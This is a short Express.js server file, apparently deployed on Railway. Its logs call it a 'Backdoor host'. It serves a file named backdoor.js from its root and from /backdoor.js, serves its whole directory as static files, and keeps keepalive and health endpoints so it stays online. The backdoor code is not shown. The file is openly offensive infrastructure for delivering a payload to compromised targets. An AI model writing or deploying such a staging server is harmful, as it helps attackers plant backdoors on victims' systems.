const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from current directory
app.use(express.static(__dirname));

// Root route - serve backdoor.js
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Explicit route for backdoor.js
app.get('/backdoor.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Health check for Railway
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Keepalive endpoint
app.get('/keepalive', (req, res) => {
    res.status(200).send('OK');
});

// Handle 404s gracefully
app.use((req, res) => {
    res.status(404).send('Not found');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🔗 Backdoor host running on port ${PORT}`);
    console.log(`📄 Serve backdoor.js at: /backdoor.js`);
    console.log(`✅ Health check at: /health`);
});
